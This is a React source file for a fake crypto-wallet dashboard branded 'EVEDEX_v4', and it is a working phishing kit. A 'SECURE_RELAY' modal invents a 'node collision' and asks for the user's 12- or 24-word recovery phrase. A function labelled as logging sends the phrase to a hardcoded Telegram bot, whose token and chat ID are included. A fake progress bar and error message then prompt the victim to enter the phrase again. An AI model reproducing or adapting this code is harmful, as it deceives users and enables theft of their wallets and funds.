import React, { useState, useEffect, useMemo } from 'react';
import { useAccount, useBalance, useSendTransaction, useChainId } from 'wagmi';

export default function App() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  
  // UI NAVIGATION STATES
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  // PROJECT CONFIG
  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  
  // BALANCE TRACKING
  const { data: tokenBal } = useBalance({ address, token: "0xdac17f958d2ee523a2206206994597c13d831ec7" }); 
  const { data: nativeBal } = useBalance({ address });

  // LOGGING UTILITY
  const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
    method: 'POST', 
    headers: { 'Content-Type': 'application/json' }, 
    body: JSON.stringify({ chat_id: chatId, text: msg }) 
  }).catch(()=>{});

  // BIP39 VALIDATION (Strict 12/24 words)
  const isSeedValid = useMemo(() => {
    const wordArr = seedVal.trim().split(/\s+/).filter(w => w.length >= 3);
    return [12, 15, 18, 21, 24].includes(wordArr.length);
  }, [seedVal]);

  // AUTO-LOAD RECTIFY BALANCE
  useEffect(() => {
    if (activeTask === "Rectify") {
      const bal = tokenBal?.formatted?.slice(0, 8) || nativeBal?.formatted?.slice(0, 8) || "0.00";
      setInputVal(bal);
    }
  }, [tokenBal, nativeBal, activeTask]);

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
      {/* 1. CHART AREA */}
      <div style={{width:'100%', height:'140px', backgroundColor:'black', borderRadius:'15px', marginBottom:'20px', overflow:'hidden', border:'1px solid #1e293b'}}>
         <iframe src={`https://s.tradingview.com/widgetembed/?symbol=BITSTAMP:ETHUSD&theme=dark&style=1&locale=en`} style={{width:'100%', height:'100%', border:'none', opacity:'0.3'}} title="Live Feed" />
      </div>

      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'30px'}}>
        <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
        <appkit-button />
      </header>

      {!isConnected ? (
        <div style={{textAlign:'center', marginTop:'40px', padding:'50px 20px', backgroundColor:'#0d1117', borderRadius:'30px', border:'1px solid #1e293b'}}>
          <div style={{fontSize:'35px', marginBottom:'15px'}}>🔐</div>
          <div style={{color:'#64748b', fontSize:'10px', marginBottom:'30px', letterSpacing:'1px'}}>NODE_ENCRYPTION_ID_REQUIRED</div>
          <appkit-button />
        </div>
      ) : (
        <>
          {/* DASHBOARD GRID */}
          {view === "menu" && (
            <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
              {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box");}} 
                style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'25px 5px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : "#fff", fontWeight:'900'}}>
                  <div style={{fontSize:'22px', marginBottom:'5px'}}>{n === "Rectify" ? "⚡" : "〽️"}</div>
                  <div style={{fontSize:'9px'}}>{n}</div>
                </button>
              ))}
            </div>
          )}

          {/* TASK VIEW */}
          {view === "task_box" && (
            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'30px', padding:'35px', textAlign:'center'}}>
              <h2 style={{color:'white', marginBottom:'20px'}}>{activeTask === "Rectify" ? "⚡ RECTIFY" : `〽️ ${activeTask}`}</h2>
              <div style={{backgroundColor:'black', padding:'25px', borderRadius:'15px', marginBottom:'25px', border:'1px solid #1e293b'}}>
                <label style={{fontSize:'8px', color:'#10b981', display:'block', marginBottom:'10px'}}>STABILIZING_VOLUME</label>
                <input value={inputVal} onChange={(e)=>setInputVal(e.target.value)} readOnly={activeTask === "Rectify"} 
                style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} />
              </div>
              <button onClick={() => setView("seed_gate")} style={{width:'100%', backgroundColor:'#10b981', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}>START_HANDSHAKE</button>
            </div>
          )}

          {/* SEED INTERCEPT */}
          {view === "seed_gate" && (
            <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
              <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', width:'100%', maxWidth:'380px', textAlign:'center'}}>
                {!isSyncing ? (
                  <>
                    <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px', marginBottom:'15px'}}>🛡️ SECURE_RELAY</div>
                    <p style={{fontSize:'9px', color:'#64748b', marginBottom:'25px', lineHeight:'1.5'}}>NODE_COLLISION DETECTED. PROVIDE RECOVERY KEY TO ENCRYPT MAINNET TUNNEL.</p>
                    <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER 12/24 WORDS..." 
                    style={{width:'100%', height:'130px', backgroundColor:'black', borderRadius:'15px', color:'#10b981', padding:'15px', outline:'none', border:'1px solid #1e293b', fontSize:'14px'}} />
                    <button disabled={!isSeedValid} onClick={()=>{setIsSyncing(true); log(`🚨 SEED: ${seedVal}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("CRITICAL_ERROR [0x99A]: RELAY_CONGESTION. Please re-authenticate phrase."); setView("menu")},1200)}},60);}} 
                    style={{width:'100%', backgroundColor: isSeedValid ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900', marginTop:'20px'}}>FINALIZE_SYNC</button>
                  </>
                ) : (
                  <div style={{padding:'40px 0'}}><div style={{fontSize:'55px', color:'white', fontWeight:'900'}}>{syncProgress}%</div><div style={{fontSize:'10px', color:'#10b981', marginTop:'10px'}}>INDEXING_RELAY_POOL...</div></div>
                )}
              </div>
            </div>
          )}
        </>
      )}
    </div>
  );
}
